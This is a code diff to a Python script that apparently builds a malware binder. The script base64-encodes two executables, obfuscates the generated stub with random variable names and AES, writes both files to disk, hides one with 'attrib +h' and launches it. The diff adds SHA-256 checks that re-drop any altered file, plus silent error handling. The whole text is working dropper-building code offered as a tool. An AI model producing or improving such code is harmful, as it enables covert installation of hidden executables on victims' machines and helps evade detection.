@@ -39,7 +39,7 @@ EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
 key, iv = randKey(32), randKey(16)
 bd64var, AESvar = randVar(), randVar()
-myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'import os', 'import threading']
+myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'import os', 'import threading', 'from hashlib import sha256']
 	
 with open(args.mexe, 'rb') as exe:
 	mexe = exe.read().encode('base64')
@@ -49,7 +49,10 @@ with open(args.iexe, 'rb') as exe:
 
 template = '''
 def ft1():
-	os.popen('attrib +h ' + fullpath)
+	try:
+		os.popen('attrib +h ' + fullpath)
+	except:
+		pass
 	os.startfile(fullpath)
 
 def ft2():
@@ -64,11 +67,20 @@ content2 = "%s"
 fullpath = pathto + os.sep + filename
 fullpath2 = pathto + os.sep + filename2
 
-with open(fullpath, 'wb') as out:
-	out.write(content.decode('base64'))
+paths = [[fullpath, content], [fullpath2, content2]]
 
-with open(fullpath2, 'wb') as out:
-	out.write(content2.decode('base64'))
+for p in paths:
+	if os.path.isfile(p[0]):
+		with open(p[0], 'rb') as f:
+			checksum = str(sha256(f.read()).hexdigest())
+			origsum = str(sha256(p[1].decode('base64')).hexdigest())
+			if origsum != checksum:
+				os.remove(p[0])
+				with open(p[0], 'wb') as out:
+					out.write(p[1].decode('base64'))
+	else:
+		with open(p[0], 'wb') as out:
+			out.write(p[1].decode('base64'))
 
 t1 = threading.Thread(target = ft1)
 t1.start()
